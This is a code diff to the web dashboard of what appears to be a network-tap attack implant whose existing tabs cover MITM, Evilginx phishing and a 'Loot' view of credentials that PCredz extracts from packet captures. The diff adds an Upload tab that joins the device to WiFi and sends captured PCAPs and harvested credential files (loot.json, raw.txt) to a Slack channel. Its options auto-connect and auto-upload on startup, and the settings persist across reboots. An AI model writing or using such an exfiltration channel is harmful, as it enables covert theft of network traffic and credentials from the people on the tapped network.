@@ -116,6 +116,7 @@ input[type="text"]:focus{outline:none;border-color:#667eea}
 <button class="tab-btn" onclick="switchTab('mitm')">MITM</button>
 <button class="tab-btn" onclick="switchTab('evilginx')">Evilginx <span id="evilginxBadge" class="badge">0</span></button>
 <button class="tab-btn" onclick="switchTab('loot')">Loot <span id="lootBadge" class="badge">0</span></button>
+<button class="tab-btn" onclick="switchTab('upload')">Upload</button>
 </div>
 <div id="statusTab" class="tab-content active">
 <div class="status-header">
@@ -311,6 +312,84 @@ input[type="text"]:focus{outline:none;border-color:#667eea}
 <p>No PCredz output yet</p>
 <p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p>
 </div>
+</div>
+</div>
+
+<div id="uploadTab" class="tab-content">
+<h2 style="margin-bottom:20px;color:#667eea">WiFi & Slack Upload</h2>
+
+<div style="background:#f8f9fa;border-radius:10px;padding:20px;margin-bottom:20px">
+<h3 style="margin-bottom:15px;color:#333">WiFi Connection</h3>
+<div style="margin-bottom:15px">
+<label style="display:block;margin-bottom:5px;font-weight:600">WLAN Interface</label>
+<select id="wifiInterface" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
+<option value="">Select interface...</option>
+</select>
+<button onclick="scanAPs()" class="btn btn-refresh" style="width:100%">Scan for APs</button>
+</div>
+<div id="apList" style="margin-bottom:15px;max-height:200px;overflow-y:auto"></div>
+<div style="margin-bottom:15px">
+<label style="display:block;margin-bottom:5px;font-weight:600">SSID</label>
+<input type="text" id="wifiSSID" placeholder="Network name" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
+<label style="display:block;margin-bottom:5px;font-weight:600">Password</label>
+<input type="password" id="wifiPassword" placeholder="WiFi password" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
+<div class="button-group">
+<button onclick="connectWiFi()" class="btn btn-start">Connect</button>
+<button onclick="disconnectWiFi()" class="btn btn-stop">Disconnect</button>
+<button onclick="testInternet()" class="btn btn-refresh">Test Internet</button>
+</div>
+</div>
+<div id="wifiStatus" style="padding:10px;background:#fff;border-radius:5px;margin-top:10px"></div>
+</div>
+
+<div style="background:#f8f9fa;border-radius:10px;padding:20px;margin-bottom:20px">
+<h3 style="margin-bottom:15px;color:#333">Slack Integration</h3>
+<div style="margin-bottom:15px">
+<label style="display:block;margin-bottom:5px;font-weight:600">Webhook URL</label>
+<input type="text" id="slackWebhook" placeholder="https://hooks.slack.com/services/..." style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
+<button onclick="testWebhook()" class="btn btn-refresh" style="width:100%;margin-bottom:10px">Test Webhook</button>
+</div>
+<div style="margin-bottom:15px">
+<label style="display:block;margin-bottom:5px;font-weight:600">Bot Token</label>
+<input type="text" id="slackToken" placeholder="xoxb-..." style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
+<button onclick="testToken()" class="btn btn-refresh" style="width:100%;margin-bottom:10px">Test Token</button>
+</div>
+<div style="margin-bottom:15px">
+<label style="display:block;margin-bottom:5px;font-weight:600">Channel</label>
+<input type="text" id="slackChannel" placeholder="#nac-tap" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
+</div>
+<div style="margin-bottom:15px;padding:15px;background:#fff;border-radius:5px">
+<label style="display:block;margin-bottom:10px;font-weight:600">Upload Options</label>
+<label style="display:flex;align-items:center;gap:10px;cursor:pointer;margin-bottom:8px">
+<input type="checkbox" id="uploadPCAP" checked> Upload PCAP files
+</label>
+<label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+<input type="checkbox" id="uploadPCredz" checked> Upload PCredz output (loot.json + raw.txt)
+</label>
+</div>
+<div class="button-group">
+<button onclick="testIntegration()" class="btn btn-refresh">Test Integration</button>
+<button onclick="enableUpload()" class="btn btn-start">Enable Upload</button>
+<button onclick="triggerUpload()" class="btn btn-download">Upload Now</button>
+</div>
+<div id="slackStatus" style="padding:10px;background:#fff;border-radius:5px;margin-top:10px"></div>
+</div>
+
+<div style="background:#f8f9fa;border-radius:10px;padding:20px">
+<h3 style="margin-bottom:15px;color:#333">Configuration</h3>
+<div style="margin-bottom:15px">
+<label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+<input type="checkbox" id="autoConnect"> Auto-connect WiFi on startup
+</label>
+<label style="display:flex;align-items:center;gap:10px;cursor:pointer;margin-top:10px">
+<input type="checkbox" id="autoUpload"> Auto-enable upload on startup
+</label>
+</div>
+<div class="button-group">
+<button onclick="saveConfig()" class="btn btn-start">Save Configuration</button>
+<button onclick="loadConfig()" class="btn btn-refresh">Load Saved</button>
+</div>
+<div id="configStatus" style="padding:10px;background:#fff;border-radius:5px;margin-top:10px"></div>
 </div>
 </div>
 </div>
@@ -564,6 +643,23 @@ logEl.innerHTML=logHTML;
 logEl.scrollTop=logEl.scrollHeight;
 }
 }
+if(data.wifi){
+updateWifiStatus(data.wifi);
+}
+if(data.slack){
+const slackStatus=document.getElementById("slackStatus");
+if(slackStatus){
+let html="<strong>Upload Status:</strong><br>";
+html+="Enabled: "+(data.slack.enabled?"Yes":"No")+"<br>";
+if(data.slack.last_upload_time){
+html+="Last Upload: "+new Date(data.slack.last_upload_time).toLocaleString()+"<br>";
+}
+if(data.slack.last_heartbeat_time){
+html+="Last Heartbeat: "+new Date(data.slack.last_heartbeat_time).toLocaleString();
+}
+slackStatus.innerHTML=html;
+}
+}
 }catch(err){
 console.error("Error updating status:",err);
 }
@@ -653,12 +749,250 @@ console.log('Delete button listener attached');
 console.log('Fetching initial status...');
 fetchStatus();
 setInterval(fetchStatus,3000);
+loadWifiInterfaces();
+loadConfig();
 console.log('Setup complete!');
 }catch(err){
 console.error('DOMContentLoaded error:',err);
 alert('Initialization error: '+err.message);
 }
 });
+
+async function loadWifiInterfaces(){
+try{
+const res=await fetch("/api/wifi/interfaces");
+const data=await res.json();
+const select=document.getElementById("wifiInterface");
+if(select){
+select.innerHTML='<option value="">Select interface...</option>';
+if(data.interfaces){
+data.interfaces.forEach(function(iface){
+const opt=document.createElement("option");
+opt.value=iface;
+opt.textContent=iface;
+select.appendChild(opt);
+});
+}
+}
+}catch(err){console.error("Failed to load interfaces:",err)}
+}
+
+async function scanAPs(){
+const iface=document.getElementById("wifiInterface").value;
+if(!iface){showAlert("Select interface first","error");return}
+showAlert("Scanning for APs...","info");
+try{
+const res=await fetch("/api/wifi/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({interface:iface})});
+const data=await res.json();
+if(data.success){
+const apList=document.getElementById("apList");
+if(apList){
+if(data.aps.length===0){
+apList.innerHTML="<p style='color:#999;padding:20px;text-align:center'>No APs found</p>";
+}else{
+let html="<div style='display:flex;flex-direction:column;gap:5px'>";
+data.aps.forEach(function(ap){
+html+="<div onclick=\"selectAP('"+ap.ssid+"')\" style='padding:10px;background:#fff;border:1px solid #e0e0e0;border-radius:5px;cursor:pointer;transition:all .3s' onmouseover=\"this.style.borderColor='#667eea'\" onmouseout=\"this.style.borderColor='#e0e0e0'\">";
+html+="<strong>"+ap.ssid+"</strong> - Signal: "+(ap.signal||-100)+" dBm - "+ap.security;
+html+="</div>";
+});
+html+="</div>";
+apList.innerHTML=html;
+}
+}
+showAlert("Found "+data.aps.length+" APs","success");
+}else{
+showAlert("Scan failed: "+(data.error||"Unknown"),"error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+function selectAP(ssid){
+document.getElementById("wifiSSID").value=ssid;
+}
+
+async function connectWiFi(){
+const iface=document.getElementById("wifiInterface").value;
+const ssid=document.getElementById("wifiSSID").value;
+const password=document.getElementById("wifiPassword").value;
+if(!iface||!ssid){showAlert("Interface and SSID required","error");return}
+showAlert("Connecting...","info");
+try{
+const res=await fetch("/api/wifi/connect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({interface:iface,ssid:ssid,password:password})});
+const data=await res.json();
+if(data.success){
+showAlert("Connected! Testing internet...","success");
+updateWifiStatus(data);
+testInternet();
+}else{
+showAlert("Connection failed: "+(data.error||"Unknown"),"error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function disconnectWiFi(){
+try{
+const res=await fetch("/api/wifi/disconnect",{method:"POST"});
+const data=await res.json();
+if(data.success){
+showAlert("Disconnected","success");
+updateWifiStatus({connected:false});
+}else{
+showAlert("Disconnect failed","error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function testInternet(){
+try{
+const res=await fetch("/api/wifi/test",{method:"POST"});
+const data=await res.json();
+const status=document.getElementById("wifiStatus");
+if(status){
+let html="<strong>Internet Test:</strong><br>";
+html+="Ping: "+(data.ping?"OK":"FAIL")+"<br>";
+html+="DNS: "+(data.dns?"OK":"FAIL")+"<br>";
+html+="Status: "+(data.connected?"<span style='color:#28a745'>Connected</span>":"<span style='color:#dc3545'>No Internet</span>");
+status.innerHTML=html;
+}
+}catch(err){console.error("Test failed:",err)}
+}
+
+function updateWifiStatus(data){
+const status=document.getElementById("wifiStatus");
+if(status){
+let html="<strong>WiFi Status:</strong><br>";
+if(data.connected){
+html+="Connected to: "+data.ssid+"<br>";
+html+="IP: "+(data.ip_address||"N/A")+"<br>";
+html+="Gateway: "+(data.gateway||"N/A");
+}else{
+html+="Not connected";
+}
+status.innerHTML=html;
+}
+}
+
+async function testWebhook(){
+const url=document.getElementById("slackWebhook").value;
+if(!url){showAlert("Enter webhook URL","error");return}
+showAlert("Testing webhook...","info");
+try{
+const res=await fetch("/api/slack/test/webhook",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({webhook_url:url})});
+const data=await res.json();
+if(data.success){
+showAlert("Webhook test successful!","success");
+}else{
+showAlert("Webhook test failed: "+(data.error||"Unknown"),"error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function testToken(){
+const token=document.getElementById("slackToken").value;
+if(!token){showAlert("Enter bot token","error");return}
+showAlert("Testing token...","info");
+try{
+const res=await fetch("/api/slack/test/token",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({bot_token:token})});
+const data=await res.json();
+if(data.success){
+showAlert("Token test successful!","success");
+}else{
+showAlert("Token test failed: "+(data.error||"Unknown"),"error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function testIntegration(){
+const webhook=document.getElementById("slackWebhook").value;
+const token=document.getElementById("slackToken").value;
+const channel=document.getElementById("slackChannel").value;
+if(!webhook||!token||!channel){showAlert("Fill all Slack fields","error");return}
+showAlert("Testing integration...","info");
+try{
+const res=await fetch("/api/slack/test/integration",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({webhook_url:webhook,bot_token:token,channel:channel})});
+const data=await res.json();
+if(data.success&&data.webhook&&data.token){
+showAlert("Integration test successful!","success");
+}else{
+showAlert("Integration test failed","error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function enableUpload(){
+const webhook=document.getElementById("slackWebhook").value;
+const token=document.getElementById("slackToken").value;
+const channel=document.getElementById("slackChannel").value;
+if(!webhook||!token||!channel){showAlert("Configure Slack first","error");return}
+try{
+await fetch("/api/slack/configure",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({webhook_url:webhook,bot_token:token,channel:channel})});
+const uploadPcap=document.getElementById("uploadPCAP").checked;
+const uploadPcredz=document.getElementById("uploadPCredz").checked;
+const res=await fetch("/api/upload/enable",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({enabled:true,upload_pcap:uploadPcap,upload_pcredz:uploadPcredz})});
+const data=await res.json();
+if(data.success){
+showAlert("Auto-upload enabled","success");
+saveConfig();
+}else{
+showAlert("Failed to enable upload","error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function triggerUpload(){
+showAlert("Uploading...","info");
+try{
+const res=await fetch("/api/upload/trigger",{method:"POST"});
+const data=await res.json();
+if(data.success){
+showAlert("Upload triggered","success");
+}else{
+showAlert("Upload failed","error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function saveConfig(){
+const wifi={interface:document.getElementById("wifiInterface").value,ssid:document.getElementById("wifiSSID").value,password:document.getElementById("wifiPassword").value,auto_connect:document.getElementById("autoConnect").checked};
+const slack={webhook_url:document.getElementById("slackWebhook").value,bot_token:document.getElementById("slackToken").value,channel:document.getElementById("slackChannel").value,auto_upload:document.getElementById("autoUpload").checked,upload_pcap:document.getElementById("uploadPCAP").checked,upload_pcredz:document.getElementById("uploadPCredz").checked};
+showAlert("Saving configuration...","info");
+try{
+const res=await fetch("/api/config/save",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wifi:wifi,slack:slack})});
+const data=await res.json();
+if(data.success){
+showAlert("Configuration saved! Will persist across reboots.","success");
+const status=document.getElementById("configStatus");
+if(status)status.innerHTML="<span style='color:#28a745'>Configuration saved</span>";
+}else{
+showAlert("Save failed: "+(data.error||"Unknown"),"error");
+}
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
+async function loadConfig(){
+try{
+const res=await fetch("/api/config/load");
+const data=await res.json();
+if(data.wifi){
+document.getElementById("wifiInterface").value=data.wifi.interface||"";
+document.getElementById("wifiSSID").value=data.wifi.ssid||"";
+document.getElementById("autoConnect").checked=data.wifi.auto_connect||false;
+}
+if(data.slack){
+document.getElementById("slackWebhook").value=data.slack.webhook_url||"";
+document.getElementById("slackToken").value=data.slack.bot_token||"";
+document.getElementById("slackChannel").value=data.slack.channel||"";
+document.getElementById("autoUpload").checked=data.slack.auto_upload||false;
+document.getElementById("uploadPCAP").checked=data.slack.upload_pcap!==undefined?data.slack.upload_pcap:true;
+document.getElementById("uploadPCredz").checked=data.slack.upload_pcredz!==undefined?data.slack.upload_pcredz:true;
+}
+showAlert("Configuration loaded","success");
+const status=document.getElementById("configStatus");
+if(status)status.innerHTML="<span style='color:#28a745'>Configuration loaded</span>";
+}catch(err){showAlert("Error: "+err.message,"error")}
+}
+
 console.log('Script loaded, waiting for DOM...');
 </script>
 </body>
